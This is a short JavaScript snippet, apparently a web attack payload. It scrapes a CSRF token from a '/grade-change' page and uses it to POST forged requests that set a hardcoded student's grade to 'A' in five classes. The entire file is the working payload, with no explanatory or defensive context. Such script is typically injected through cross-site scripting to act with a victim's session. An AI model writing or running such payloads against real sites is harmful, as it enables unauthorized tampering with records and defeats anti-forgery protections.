const student_id = '3c036e6b-3dda-456e-98ce-6d24a5ba4ca7';

(async () => {
    for (let class_id of [
        '19481783-157e-45e1-8592-77efd688144a',
        'a4b983d9-5a11-4329-abbd-12ff84442187',
        'ecadcb65-a8a2-4b06-8867-90609cff321f',
        '6d527177-0645-4e21-86e7-2018cd6d449e',
        '3fc4f897-e3f2-4aee-aea6-f9425d30815c',
    ]) {
        const res = await fetch('/grade-change');
        const html = await res.text();
        const csrf_token = html.match(/name="csrf_token" value="(.+)"/)[1];
        await fetch('/grade-change', {
            method: 'POST',
            headers: {
                'Content-Type': 'application/x-www-form-urlencoded'
            },
            body: `csrf_token=${csrf_token}&student_id=${student_id}&class_id=${class_id}&grade=A`
        });
    }
})();
